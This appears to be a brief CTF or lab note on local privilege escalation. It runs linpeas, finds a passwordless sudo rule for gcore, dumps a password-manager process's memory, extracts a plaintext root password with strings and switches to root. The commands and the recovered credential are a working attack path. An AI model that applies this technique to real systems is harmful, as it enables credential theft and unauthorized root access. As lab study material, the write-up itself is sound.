\./linpeas\.sh

-  gcore \(nopass SUDO\)
-  ps aux \-\> to examine any interesting processes \-\> /usr/bin/password\-store \(PID 484\)
-  sudo /usr/bin/gcore 484
-  strings core\.484
-  root:ClogKingpinInning731
-  su root
# root
